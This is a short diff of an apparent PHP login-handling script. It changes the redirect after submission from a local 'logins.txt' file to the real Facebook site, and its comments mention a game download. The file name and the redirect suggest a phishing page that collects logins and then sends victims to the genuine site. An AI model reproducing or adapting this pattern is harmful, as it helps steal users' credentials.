@@ -16,7 +16,7 @@
 			
   			//redirecting user to the google drive's locations where the game is available to download.
   			//change the location url to redirect to a website of your choice.
-  			header("Location: /logins.txt");
+  			header("Location: https://www.facebook.com");
 			exit();
 			
 			session_destroy();
